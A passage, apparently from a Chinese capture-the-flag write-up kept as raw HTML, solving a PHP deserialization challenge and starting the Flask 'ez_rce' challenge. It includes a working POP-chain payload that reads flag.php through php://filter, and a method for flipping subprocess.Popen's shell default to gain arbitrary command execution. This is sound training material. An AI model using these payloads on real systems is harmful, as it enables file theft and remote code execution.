comment\">//        $this->miaomiao();</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">//        $this->gao=$this->fei;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">//        die($this->a);</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">//    &#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">//    public function miaomiao()&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">//        $this->a='Mikey Mouse~';</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">//    &#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">musca</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$ding</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$dong</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">//    public function __wakeup()&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">//        return $this->ding->dong;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">//    &#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">milaoshu</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$v</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"php://filter/convert.base64-encode/resource=flag.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\">//    public function __tostring()&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\">//        echo\"misca~musca~milaoshu~~~\";</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">//        include($this->v);</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">//    &#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\">//function check($data)&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\">//    if(preg_match('/^O:\\d+/',$data))&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\">//        die(\"you should think harder!\");</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">//    &#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token comment\">//    else return $data;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">musca</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">-></span> <span class=\"token property\">ding</span><span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">misca</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">-></span> <span class=\"token property\">ding</span> <span class=\"token operator\">-></span><span class=\"token property\">fei</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">milaoshu</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">-></span> <span class=\"token property\">ding</span> <span class=\"token operator\">-></span><span class=\"token property\">gao</span><span class=\"token operator\">=</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$a</span> <span class=\"token operator\">-></span><span class=\"token property\">ding</span><span class=\"token operator\">-></span><span class=\"token property\">a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><blockquote>\n<p>?wanna[fl.ag=a:1:{i:0;O:5:&quot;musca&quot;:2:{s:4:&quot;ding&quot;;O:5:&quot;misca&quot;:3:{s:3:&quot;gao&quot;;N;s:3:&quot;fei&quot;;O:8:&quot;milaoshu&quot;:1:{s:1:&quot;v&quot;;s:52:&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;}s:1:&quot;a&quot;;R:4;}s:4:&quot;dong&quot;;N;}}</p>\n</blockquote>\n<h3 id=\"week2ez_rce\"><a class=\"anchor\" href=\"#week2ez_rce\">#</a> [WEEK2]ez_rce</h3>\n<p>题目附件：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> subprocess</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>app <span class=\"token operator\">=</span> Flask<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">gett</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span>arg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    tmp <span class=\"token operator\">=</span> obj</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> arg<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        tmp <span class=\"token operator\">=</span> <span class=\"token builtin\">getattr</span><span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">return</span> tmp</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">sett</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span>arg<span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    tmp <span class=\"token operator\">=</span> obj</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>arg<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        tmp <span class=\"token operator\">=</span> <span class=\"token builtin\">getattr</span><span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">,</span>arg<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token builtin\">setattr</span><span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">,</span>arg<span class=\"token punctuation\">[</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">hint</span><span class=\"token punctuation\">(</span>giveme<span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">,</span>bol<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    c <span class=\"token operator\">=</span> gett<span class=\"token punctuation\">(</span>subprocess<span class=\"token punctuation\">,</span>giveme<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    tmp <span class=\"token operator\">=</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    tmp<span class=\"token punctuation\">[</span>num<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> bol</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    tmp <span class=\"token operator\">=</span> <span class=\"token builtin\">tuple</span><span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    sett<span class=\"token punctuation\">(</span>subprocess<span class=\"token punctuation\">,</span>giveme<span class=\"token punctuation\">,</span>tmp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>arg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    subprocess<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">(</span>arg<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span>methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">if</span> request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'exec'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token string\">'ok'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>            shell <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'shell'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            cmd<span class=\"token punctuation\">(</span>shell<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            exp <span class=\"token operator\">=</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span>get_json<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string\">'exp'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            num <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'num'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            bol <span class=\"token operator\">=</span> <span class=\"token builtin\">bool</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'bol'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>            hint<span class=\"token punctuation\">(</span>exp<span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">,</span>bol<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">'ok'</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">'error'</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    app<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span>host<span class=\"token operator\">=</span><span class=\"token string\">'0.0.0.0'</span><span class=\"token punctuation\">,</span>port<span class=\"token operator\">=</span><span class=\"token number\">5000</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>解释下这串代码：</p>\n<p>这段代码是一个使用 Flask 构建的 Web 应用程序，它提供了两个主要功能：</p>\n<ol>\n<li>命令执行：通过 URL 参数  <code>exec</code>  的值为 &quot;ok&quot; 时，执行一个 shell 命令。</li>\n<li>子进程属性修改：通过 POST 请求将 JSON 数据发送到  <code>/</code>  路由，该 JSON 包含了一个属性的名称和需要修改的属性值。</li>\n</ol>\n<p>以下是如何使用这个应用程序执行命令和修改子进程属性的示例：</p>\n<ol>\n<li>\n<p>命令执行：</p>\n<p>发送一个 GET 请求到  <code>http://your-server:5000/?exec=ok&amp;shell=your-command</code> ，其中  <code>your-command</code>  是你要执行的命令。这将触发  <code>cmd(shell)</code>  函数，执行指定的命令。</p>\n</li>\n<li>\n<p>修改子进程属性：</p>\n<p>发送一个 POST 请求到  <code>http://your-server:5000/</code> ，并在请求的 JSON 数据中指定属性的名称（exp）、要修改的属性索引（num）以及要设置的属性值（bol）。服务器将调用  <code>hint(exp, num, bol)</code>  函数，以修改子进程属性。</p>\n</li>\n</ol>\n<p>通过网上的资料可以得知：</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>subprocess.<span class=\"token function\">call</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>执行由参数提供的命令.</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>我们可以用数组作为参数运行命令<span class=\"token punctuation\">,</span>也可以用字符串作为参数运行命令<span class=\"token punctuation\">(</span>通过设置参数shell=True<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>注意<span class=\"token punctuation\">,</span>参数shell默认为False</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>我们用subprocess.<span class=\"token function\">call</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>来做一个统计磁盘的例子<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>subprocess.<span class=\"token function\">call</span><span class=\"token punctuation\">(</span>[<span class=\"token string\">'df'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-h'</span>]<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>下面的例子把shell设置为True</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>subprocess.<span class=\"token function\">call</span><span class=\"token punctuation\">(</span><span class=\"token string\">'du -hs $HOME'</span><span class=\"token punctuation\">,</span> shell=True<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>那现在大致明白这题的意思了，通过 hint 函数修改 subprocess.call () 函数中的 shell 为 true，再执行系统命令。</p>\n<p>那就进入 subprocess 函数查看 call 函数是怎样构成的：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">call</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>popenargs<span class=\"token punctuation\">,</span> timeout<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">**</span>kwargs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token triple-quoted-string string\">\"\"\"Run command with arguments.  Wait for command to complete or</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    timeout, then return the returncode attribute.</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    The arguments are the same as for the Popen constructor.  Example:</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    retcode = call([\"ls\", \"-l\"])</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    \"\"\"</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">with</span> Popen<span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>popenargs<span class=\"token punctuation\">,</span> <span class=\"token operator\">**</span>kwargs<span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> p<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token keyword\">return</span> p<span class=\"token punctuation\">.</span>wait<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span>timeout<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># Including KeyboardInterrupt, wait handled that.</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            p<span class=\"token punctuation\">.</span>kill<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token comment\"># We don't call p.wait() again as p.__exit__ does that for us.</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token keyword\">raise</span></pre></td></tr></table></figure><p>这段代码定义了一个高级的  <code>call</code>  函数，它使用  <code>Popen</code>  类来启动一个子进程，等待子进程完成，并返回命令的返回码。这个函数还支持设置超时，如果命令执行时间超过指定的超时时间，将引发超时异常。此外，它会处理异常，确保子进程被终止，然后再次引发异常。这使得在执行外部命令时能够更加安全和可控。</p>\n<p>既然说他使用 Popen 类来启动，那就去 Popen 类看看：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Popen</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token triple-quoted-string string\">\"\"\" Execute a child program in a new process.</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    For a complete description of the arguments see the Python documentation.</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    Arguments:</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>      args: A string, or a sequence of program arguments.</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>      bufsize: supplied as the buffering argument to the open() function when</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>          creating the stdin/stdout/stderr pipe file objects</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      executable: A replacement program to execute.</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      stdin, stdout and stderr: These specify the executed programs' standard</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>          input, standard output and standard error file handles, respectively.</pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      preexec_fn: (POSIX only) An object to be called in the child process</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>          just before the child is executed.</pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      close_fds: Controls closing or inheriting of file descriptors.</pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>      shell: If true, the command will be executed through the shell.</pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>      cwd: Sets the current directory before the child is executed.</pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>      env: Defines the environment variables for the new process.</pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>      text: If true, decode stdin, stdout and stderr using the given encoding</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>          (if set) or the system default otherwise.</pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>      universal_newlines: Alias of text, provided for backwards compatibility.</pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>      startupinfo and creationflags (Windows only)</pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>      restore_signals (POSIX only)</pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>      start_new_session (POSIX only)</pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>      pass_fds (POSIX only)</pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>      encoding and errors: Text mode encoding and error handling to use for</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>          file objects stdin, stdout and stderr.</pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    Attributes:</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        stdin, stdout, stderr, pid, returncode</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    \"\"\"</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    _child_created <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span>  <span class=\"token comment\"># Set here since __del__ checks it</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">,</span> bufsize<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> executable<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>                 stdin<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> stdout<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> stderr<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>                 preexec_fn<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> close_fds<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>                 shell<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span> cwd<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> env<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> universal_newlines<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>                 startupinfo<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> creationflags<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>                 restore_signals<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> start_new_session<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>                 pass_fds<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> encoding<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> errors<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> text<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>        <span class=\"token triple-quoted-string string\">\"\"\"Create new Popen instance.\"\"\"</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        _cleanup<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><ul>\n<li><code>Popen</code>  类是  <code>subprocess</code>  模块中的一个用于处理子进程的类。</li>\n<li>构造函数  <code>__init__</code>  接受多个参数，用于配置子进程的行为和执行。这些参数包括：\n<ul>\n<li><code>args</code> ：指定要执行的命令及其参数的字符串或序列。</li>\n<li><code>bufsize</code> ：用于设置标准输入、标准输出和标准错误的缓冲大小。</li>\n<li><code>executable</code> ：可选的替代程序名称。</li>\n<li><code>stdin</code> ,  <code>stdout</code> , 和  <code>stderr</code> ：指定执行程序的标准输入、标准输出和标准错误文件句柄。</li>\n<li><code>preexec_fn</code> ：（仅限 POSIX）在子进程执行前调用的函数。</li>\n<li><code>close_fds</code> ：控制文件描述符的关闭或继承。</li>\n<li><code>shell</code> ：如果为  <code>True</code> ，则通过 shell 执行命令。</li>\n<li><code>cwd</code> ：设置子进程的当前工作目录。</li>\n<li><code>env</code> ：定义新进程的环境变量。</li>\n<li><code>text</code> ：如果为  <code>True</code> ，则使用给定的编码（如果设置）或系统默认编码解码标准输入、标准输出和标准错误。</li>\n<li>其他参数用于配置 Windows 系统下的一些行为。</li>\n</ul>\n</li>\n<li><code>Popen</code>  类的实例具有一些属性，包括  <code>stdin</code> 、 <code>stdout</code> 、 <code>stderr</code> 、 <code>pid</code>  和  <code>returncode</code> ，用于访问子进程的标准输入、标准输出、标准错误、进程 ID 和返回码。</li>\n<li><code>_child_created</code>  属性用于跟踪是否已经创建了子进程。</li>\n</ul>\n<p>通常情况下 <code>__defaults__</code>  是用于表示函数默认参数值的属性，</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> subprocess.Popen.__init__.__defaults__</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">(</span>-1, None, None, None, None, None, True, False, None, None, None, None, <span class=\"token number\">0</span>, True, False, <span class=\"token punctuation\">(</span><span class=\"token punctuation\">))</span></pre></td></tr></table></figure><p>通过查看得知 shell 参数的值在第 8 个，所以只需要修改 7 下标为 True 就可以执行任意命令了。</p>\n<p><img data-src=\"../../../images/Iknowyouwillstop/15.png\" alt=\"15\" /></p>\n<p>可以看到 